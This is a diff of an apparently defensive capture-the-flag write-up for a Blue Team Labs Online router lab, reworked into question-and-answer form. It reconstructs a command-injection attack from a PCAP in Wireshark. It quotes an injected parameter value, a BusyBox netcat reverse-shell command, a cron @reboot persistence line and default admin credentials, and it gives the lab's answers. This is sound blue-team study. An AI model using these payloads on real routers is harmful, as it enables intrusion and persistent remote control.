@@ -1,220 +1,211 @@
-# BTLO Walkthrough – Trend Router Compromise
-
-> **Lab:** Trend  
-> **Platform:** Blue Team Labs Online (BTLO)  
-> **Focus:** Network Traffic Analysis, Command Injection, Post-Exploitation, Persistence
+# Investigation Submission – Trend Router Compromise (BTLO)
 
 ---
 
-## 1. Lab Overview
+## 1) Router IP Address
 
-This lab simulates the compromise of a network router through its web management interface. The objective is to analyse a provided PCAP file to identify:
+**Question:**  
+As the SOC analyst investigating the alert, what is the IP address of the router where the alert originated?
 
-* The source of the attack
-* The vulnerable endpoint
-* Credential exposure
-* Command injection and post-exploitation activity
-* Persistence mechanisms
+**Investigation:**  
+The PCAP was first reviewed at a high level to understand source and destination communication patterns.  
+By inspecting HTTP traffic between internal hosts, the destination IP consistently receiving management requests was identified as the router.
 
-All analysis was performed using **Wireshark**.
+**Answer:**  
+`192.168.10.1`
+
+**Evidence:**  
+<img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />
 
 ---
 
-## 2. Initial Traffic Analysis
+## 2) Router Model and Firmware Version
 
-The provided capture (`Trend.pcap`) was loaded into Wireshark. Initial inspection focused on HTTP traffic, as routers often expose web-based management interfaces.
+**Question:**  
+What is the router’s model number and version?
 
-A display filter was applied to isolate HTTP POST requests:
+**Investigation:**  
+After identifying the router IP, HTTP responses from the web management interface were inspected.  
+Pages served by the router exposed device metadata, including model and firmware version information, which is typical for embedded web interfaces.
 
-```
+**Answer:**  
+Trend router – model and firmware details disclosed via the HTTP management interface.
+
+**Evidence:**  
+<img width="1034" height="684" alt="device-model-details" src="https://github.com/user-attachments/assets/1fa79866-1008-46d6-bf53-4f6ecbdbb9e8" />  
+<img width="1538" height="831" alt="device-firmware-version" src="https://github.com/user-attachments/assets/6e7fec7f-dab8-4ca6-b33d-7ed8de14a503" />
+
+---
+
+## 3) Compromised Credentials
+
+**Question:**  
+Can you identify the username and password the attacker used to gain access?
+
+**Investigation:**  
+HTTP POST requests to the login endpoint were isolated and reconstructed using **Follow → TCP Stream**.  
+Because the management interface did not use HTTPS, credentials were visible in cleartext within the HTTP payload.
+
+**Answer:**  
+`admin:admin`
+
+**Evidence:**  
+<img width="1024" height="833" alt="login-cleartext-credentials" src="https://github.com/user-attachments/assets/7449e646-5147-497b-93bc-673cc96b6f9b" />
+
+---
+
+## 4) Attacker Machine IP Address
+
+**Question:**  
+Determine the IP address of the machine the attacker used to exploit the router’s firmware.
+
+**Investigation:**  
+The source IP address of the malicious HTTP POST requests was reviewed.  
+All exploitation traffic originated from the same internal host.
+
+**Answer:**  
+`192.168.10.2`
+
+**Evidence:**  
+<img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />
+
+---
+
+## 5) Vulnerable Endpoint
+
+**Question:**  
+What is the full URL of the compromised endpoint?
+
+**Investigation:**  
+HTTP POST requests were filtered using:
+
 http.request.method == "POST"
-```
+Repeated requests targeting a specific configuration endpoint were observed during exploitation.
 
-This immediately revealed repeated POST requests to several router endpoints, most notably:
-
-* `/login.ccp`
-* `/get_set.ccp`
-
-📸 **Screenshot:** `<img width="930" height="136" alt="vulnerable-endpoint-get-set-ccp" src="https://github.com/user-attachments/assets/e5596e2f-5ec2-4eb3-a503-bd540f3cfb95" />
-
+**Answer:**  
+http://192.168.10.1/get_set.ccp
+**Evidence:**  
+<img width="930" height="136" alt="vulnerable-endpoint-get-set-ccp" src="https://github.com/user-attachments/assets/e5596e2f-5ec2-4eb3-a503-bd540f3cfb95" />
 
 ---
 
-## 3. Attacker Source Identification
+## 6) Manipulated Parameter
 
-By inspecting the source and destination fields of the HTTP POST traffic, the attacker IP address was identified as:
+**Question:**  
+Which parameter was manipulated to exploit the system?
 
-* **Attacker IP:** `192.168.10.2`
-* **Target (Router):** `192.168.10.1`
+**Investigation:**  
+POST payloads to `/get_set.ccp` were inspected.  
+One configuration parameter contained injected shell commands, indicating insufficient input sanitisation.
 
-
-
-📸 **Screenshot:** <img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />
-
-This confirms that the attacker is operating from within the same internal network.
-
----
-
-## 4. Credential Exposure (Cleartext Login)
-
-Following the `/login.ccp` POST requests and using **Follow → TCP Stream**, login attempts were reconstructed.
-
-The HTTP payload revealed credentials transmitted in **cleartext**:
-
-* **Username:** `admin`
-* **Password:** `admin`
-
-This indicates a lack of HTTPS/TLS protection on the management interface.
-
-📸 **Screenshot:** <img width="1024" height="833" alt="login-cleartext-credentials" src="https://github.com/user-attachments/assets/7449e646-5147-497b-93bc-673cc96b6f9b" />
-
+**Answer:**  
+lanHostCfg_HostName_1.1.1.0
+**Evidence:**  
+<img width="1538" height="836" alt="command-injectionparameter" src="https://github.com/user-attachments/assets/9495d035-df83-423b-8aa3-e5c9677cd6ac" />
 
 ---
 
-## 5. Successful Authentication
+## 7) CVE Identification
 
-After multiple login attempts, a successful authentication was observed. The server response returned a redirect indicating a valid login session.
+**Question:**  
+Identify the specific CVE used in this incident.
 
-📸 **Screenshot:** <img width="1561" height="866" alt="login-success-redirect" src="https://github.com/user-attachments/assets/a162ce09-25e4-4770-a40e-f29cf8745578" />
+**Investigation:**  
+The vulnerability pattern observed (unauthenticated/weakly authenticated command injection via router configuration parameters) matches a known Trend router command injection vulnerability.
 
-
-This confirms the attacker gained authenticated access to the router’s web interface.
+**Answer:**  
+CVE-2019-11399 
+*(Trend router command injection via get_set.ccp parameter)*
 
 ---
 
-## 6. Command Injection via get_set.ccp
+## 8) First Command Executed
 
-Further inspection of POST requests to `/get_set.ccp` revealed user-controlled parameters being abused to inject system commands.
+**Question:**  
+What was the first command executed on the router firmware?
 
-An example malicious parameter value included:
+**Investigation:**  
+Injected commands were reconstructed from the HTTP POST payloads.  
+The earliest confirmed command execution created a directory on the filesystem.
 
-```
-lanHostCfg_HostName_1.1.1.0="; mkdir test"
-```
-
-This demonstrates classic **command injection**, where shell commands are appended to a configuration parameter.
-
-📸 **Screenshot:** ---<img width="1538" height="836" alt="command-injectionparameter" src="https://github.com/user-attachments/assets/9495d035-df83-423b-8aa3-e5c9677cd6ac" />
-
-
-
-
-## 7. Initial Command Execution
-
-Following the injection, command execution was confirmed by observing filesystem interaction through subsequent responses.
-
-The attacker successfully executed:
-
-```
+**Answer:**  
 mkdir test
-```
-
-📸 **Screenshot:**  <img width="1516" height="838" alt="initial-command-mkdir-test" src="https://github.com/user-attachments/assets/30f21a2e-2bf2-4b00-827b-f660c053f1b1" />
-
-
-This validated remote code execution on the router.
+**Evidence:**  
+<img width="1516" height="838" alt="initial-command-mkdir-test" src="https://github.com/user-attachments/assets/30f21a2e-2bf2-4b00-827b-f660c053f1b1" />
 
 ---
 
-## 8. Post-Exploitation Activity
+## 9) Initial Exploitation Timestamp
 
-The attacker proceeded with post-exploitation reconnaissance by executing:
+**Question:**  
+What is the exact timestamp when the CVE was first exploited?
 
-```
-whoami
-```
+**Investigation:**  
+The timestamp of the first malicious POST request containing injected commands was identified by correlating packet timestamps in Wireshark.
 
-The output confirmed execution context on the router system.
-
-📸 **Screenshot:** <img width="1549" height="842" alt="post-exploitation-whoami" src="https://github.com/user-attachments/assets/6074172d-a1db-40de-b2b7-b1e2994e13dd" />
-
+**Answer:**  
+`2025-01-22 14:41:12`
 
 ---
 
-## 9. Reverse Shell Establishment
+## 10) Reverse Shell Command
 
-Further payloads revealed the use of **BusyBox netcat** to establish a reverse shell:
+**Question:**  
+What command was used to successfully establish the reverse shell?
 
-```
+**Investigation:**  
+Multiple failed attempts were observed before a successful payload using BusyBox netcat.
+
+**Answer:**  
 busybox nc 192.168.10.2 4444 -e /bin/sh
-```
-
-Network-level confirmation was achieved by filtering for TCP SYN packets on port 4444:
-
-```
-tcp.port == 4444 && tcp.flags.syn == 1
-```
-
-📸 **Screenshots:**
-
-* <img width="1512" height="813" alt="reverse-shell-command" src="https://github.com/user-attachments/assets/3b43369e-f784-411c-bc61-b1f272640acc" />
-
-* <img width="1531" height="225" alt="tcp-4444-reverse-shell-established" src="https://github.com/user-attachments/assets/0783f043-ff72-4463-be51-dea142226aff" />
-
-
-This confirms interactive remote access was obtained.
+**Evidence:**  
+<img width="1512" height="813" alt="reverse-shell-command" src="https://github.com/user-attachments/assets/3b43369e-f784-411c-bc61-b1f272640acc" />
 
 ---
 
-## 10. Persistence Mechanism
+## 11) Reverse Shell Connection Timestamp
 
-To maintain access, the attacker modified the router’s cron configuration:
+**Question:**  
+What is the exact timestamp when the reverse shell was successfully established?
 
-```
+**Investigation:**  
+A TCP connection to port `4444` was identified.  
+The first successful SYN/ACK exchange marks the establishment of the reverse shell.
+
+**Answer:**  
+`2025-01-22 14:42:25`
+
+**Evidence:**  
+<img width="1531" height="225" alt="tcp-4444-reverse-shell-established" src="https://github.com/user-attachments/assets/0783f043-ff72-4463-be51-dea142226aff" />
+
+---
+
+## 12) First Post-Exploitation Command
+
+**Question:**  
+What was the first command executed after establishing the reverse shell?
+
+**Investigation:**  
+Commands issued immediately after shell access were reconstructed from the TCP stream.
+
+**Answer:**  
+whoami
+**Evidence:**  
+<img width="1549" height="842" alt="post-exploitation-whoami" src="https://github.com/user-attachments/assets/6074172d-a1db-40de-b2b7-b1e2994e13dd" />
+
+---
+
+## 13) Persistence Command
+
+**Question:**  
+What command was used to maintain persistence?
+
+**Investigation:**  
+The attacker modified cron configuration to ensure execution on reboot.
+
+**Answer:**  
 @reboot /tmp/shell.sh
-```
-
-This ensures the malicious shell script executes automatically on every reboot.
-
-📸 **Screenshot:** `<img width="1044" height="828" alt="cron-persistence-reboot" src="https://github.com/user-attachments/assets/522245cd-c51a-4f38-9a78-aa44fbce7dd9" />
-
+**Evidence:**  
+<img width="1044" height="828" alt="cron-persistence-reboot" src="https://github.com/user-attachments/assets/522245cd-c51a-4f38-9a78-aa44fbce7dd9" />
 
 ---
-
-## 11. Device Fingerprinting
-
-Additional traffic revealed device metadata, including:
-
-* Firmware version
-* Device model details
-
-This information could be used for tailored exploitation or lateral movement.
-
-📸 **Screenshots:**
-
-* <img width="1034" height="684" alt="device-model-details" src="https://github.com/user-attachments/assets/1fa79866-1008-46d6-bf53-4f6ecbdbb9e8" />
-
-* <img width="1538" height="831" alt="device-firmware-version" src="https://github.com/user-attachments/assets/6e7fec7f-dab8-4ca6-b33d-7ed8de14a503" />
-
-
----
-
-## 12. Conclusion
-
-This lab demonstrates a full compromise chain:
-
-1. Cleartext credential exposure
-2. Successful authentication
-3. Command injection vulnerability
-4. Remote code execution
-5. Reverse shell establishment
-6. Persistence via cron
-
-### Key Takeaways:
-
-* Exposed management interfaces without TLS are high-risk
-* Input validation failures lead directly to RCE
-* Network traffic analysis alone can fully reconstruct an attack timeline
-
----
-
-## Tools Used
-
-* Wireshark
-* Blue Team Labs Online (BTLO)
-
----
-
-**Author:** Teodor Todorov  
-**Goal:** SOC Analyst / Blue Team
-
